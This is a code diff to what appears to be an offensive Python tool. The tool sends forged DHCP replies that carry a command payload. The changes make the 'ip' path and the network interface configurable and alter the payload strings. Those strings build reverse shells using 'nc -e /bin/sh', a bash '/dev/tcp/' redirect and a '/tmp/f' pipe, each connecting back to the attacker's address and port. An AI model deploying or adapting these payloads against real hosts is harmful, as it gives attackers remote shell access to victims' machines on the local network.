@@ -29,6 +29,9 @@ parser.add_argument('-e', '--reverse_port', type=int, help='Set port for listen 
 parser.add_argument('-n', '--without_network', action='store_true', help='do not add network configure in payload')
 parser.add_argument('-B', '--without_base64', action='store_true', help='do not use base64 encode in payload')
 
+parser.add_argument('--ip_path', type=str, help='Set path to "ip" command, default = /bin/', default="/bin/")
+parser.add_argument('--iface_name', type=str, help='Set iface name, default = eth0', default="eth0")
+
 parser.add_argument('--dhcp_mac', type=str, help='Set DHCP server mac address, if not set use your mac address')
 parser.add_argument('--dhcp_ip', type=str, help='Set DHCP server IP address, if not set use your ip address')
 parser.add_argument('--router', type=str, help='Set router IP address, if not set use your ip address')
@@ -261,8 +264,8 @@ def dhcp_reply(request):
                 print "[INFO] Send nak response!"
 
             else:
-                net_settings = "/bin/ip addr add " + requested_ip + \
-                               "/" + str(IPAddress(network_mask).netmask_bits()) + " dev eth0;"
+                net_settings = args.ip_path + "ip addr add " + requested_ip + \
+                               "/" + str(IPAddress(network_mask).netmask_bits()) + " dev " + args.iface_name + ";"
 
                 global payload
 
@@ -278,7 +281,7 @@ def dhcp_reply(request):
                               your_ip_address + " " + str(args.reverse_port) + " >/tmp/f &"
 
                 if args.nce_reverse_shell:
-                    payload = "/bin/nc -e /bin/sh " + your_ip_address + " " + str(args.reverse_port) + " &"
+                    payload = "/bin/nc -e /bin/sh " + your_ip_address + " " + str(args.reverse_port) + " 2>&1 &"
 
                 if args.bash_reverse_shell:
                     payload = "/bin/bash -i >& /dev/tcp/" + your_ip_address + \
